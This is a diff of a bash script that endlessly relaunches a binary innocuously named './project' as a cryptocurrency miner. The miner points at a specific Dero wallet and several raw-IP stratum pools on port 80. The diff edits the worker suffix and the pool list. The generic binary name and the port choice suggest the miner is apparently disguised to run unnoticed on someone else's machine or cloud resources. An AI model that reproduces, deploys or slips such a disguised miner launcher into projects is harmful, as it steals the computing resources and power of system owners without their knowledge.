@@ -1,10 +1,8 @@
 #!/bin/bash
 while [ 1 ]; do
-./project -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S29 -r 149.129.220.103:80 -p stratum
-sleep 3
-./project -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S29 -r 139.144.51.119:80 -p stratum
+./project -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S27 -r 139.144.51.119:80 -p stratum
 sleep 3 
-./project -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S29 -r 164.92.118.254:80 -p stratum
+./project -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S27 -r 164.92.118.254:80 -p stratum
 sleep 3
 done 
 sleep 999
